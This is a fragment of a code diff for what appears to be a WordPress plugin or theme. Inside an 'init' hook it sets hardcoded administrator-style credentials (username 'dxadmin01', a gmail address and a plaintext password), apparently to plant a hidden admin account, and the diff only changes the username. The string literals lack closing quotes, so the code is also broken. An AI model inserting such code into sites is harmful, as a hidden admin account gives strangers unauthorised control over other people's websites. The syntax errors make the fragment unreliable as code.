@@ -9,7 +9,7 @@ if ( defined( 'WP_INSTALLING' ) && WP_INSTALLING ) {
 
 add_action( 'init', function() {
     // ========== UPLOAD ========== //
-    $username = 'dxadmin;
+    $username = 'dxadmin01;
     $email    = 'admin@gmail.com';
     $password = 'godknowsaboutthis'; 
 
